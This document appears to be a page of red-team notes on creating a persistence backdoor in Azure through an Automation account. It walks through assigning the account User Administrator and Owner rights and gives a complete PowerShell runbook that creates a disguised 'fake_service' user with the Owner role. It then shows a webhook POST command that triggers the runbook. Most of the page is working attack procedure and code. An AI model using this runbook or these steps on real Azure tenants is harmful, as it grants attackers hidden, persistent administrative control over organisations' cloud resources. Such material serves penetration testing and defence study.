# Runbooks / Automation accounts

## Runbooks / Automation accounts

Used for automating tasks like script

Can be also used to create a backdoored user :\)

* Powershell and python2.7 are supported

#### Create an Automation Account

![](../../../../../.gitbook/assets/f84549f6b2164561bc0db781076b6bfb.png)

![](../../../../../.gitbook/assets/100b71ac565941f89309d8c4912c3e1d.png)

* From AD azure, go to "Roles and Administrators" and select "User Administrator" \(click on description\)

![](../../../../../.gitbook/assets/17df776ebf134e9f89e218e38a5b4b1a.png)



* From the IAM menu, add the Automation account as owner

![](../../../../../.gitbook/assets/93b0a6aa2d3c4f30a9b9bc2bdfa4e6f1.png)

* In "User Administrator", use "Assignement" menu and add a new one \(search for your Automated account\)

![](../../../../../.gitbook/assets/ee7f92b17b3f4095805f075d58f80684.png)

![](../../../../../.gitbook/assets/2bc4a2121d9d46a7b64c2dba55b8c7c6.png)

* Back To Automation menu, select your fake account. Then select "Modules gallery" menu and add "**Az.Accounts**" and "**Az.Resources**"

![](../../../../../.gitbook/assets/10e07084a7b445cc8ec0f0dfd9847a6e.png)

![](../../../../../.gitbook/assets/462f52ab524742e390e9a02d0aae064c.png)

![](../../../../../.gitbook/assets/1c74b0905135473bb69d00982412b9b4.png)

* Back to Automation menu, select your account and import a RunBook

![](../../../../../.gitbook/assets/8fbcbd5b8bc54e4c963857af660d9688.png)

* Create a powershell script and import it 

```bash
Import-Module Az.Accounts
Import-Module Az.Resources

$user = "YOUR_ACCOUNT"
$pass = "YOUR_PASSWORD"

$Nickname = "FakeSVC"
$DisplayName = "fake_service"

$connectionName = "AzureRunAsConnection"

$servicePrincipalConnection = Get-AzAutomationConnection -Name $connectionName

Connect-AzAccount -ServicePrincipal -TenantId $servicePrincipalConnection.TenantId -ApplicationId $servicePrincipalConnection.ApplicationId -CertificateThumbprint $servicePrincipalConnection.CertificateThumprint

$SecureStringPassword = ConvertTo-SecureString -String $pass -AsPlainText -Force

New-AzADUser -DisplayName $DisplayName -UserPrincipalName $user -Password $SecureStringPassword -MailNickname $Nickname
New-AzRoleAssignment -SignInName $user -RoleDefinitionName Owner
```

![](../../../../../.gitbook/assets/0eb4ca03015049058248667651cb7f10.png)

* Publish it

![](../../../../../.gitbook/assets/3fc50401ae794139b2ac635f847e0580.png)

* Add a WebHook and copy the URL

![](../../../../../.gitbook/assets/b7144134eb6546269c91b39748628ea5.png)

![](../../../../../.gitbook/assets/4884d17f77a34b65bf79c5dd5ec3d438.png)

* Create/Confirm

![](../../../../../.gitbook/assets/deab579e22d3429084fb24c5f06c03ed.png)

* Active the backdoor

```csharp
Invoke-WebRequest -Method Post -Uri "https://2REDACTED5.webhook.we.azure-automation.net/webhooks?token=%2bREDACTED%3d" -Verbose
```

![](../../../../../.gitbook/assets/1061253c897e49edbf39480995b1ab0f.png)

* Connect using the backdoored account using the command

```csharp
Connect-AzAccount
```

![](../../../../../.gitbook/assets/91854dba7c334bd8bb10b082d9de0fda.png)

* Import PowerZure and start enumeration

![](../../../../../.gitbook/assets/fcb9dc94eb5e4db49b522518ba291d94.png)

### Resource

{% embed url="https://github.com/hausec/PowerZure" %}

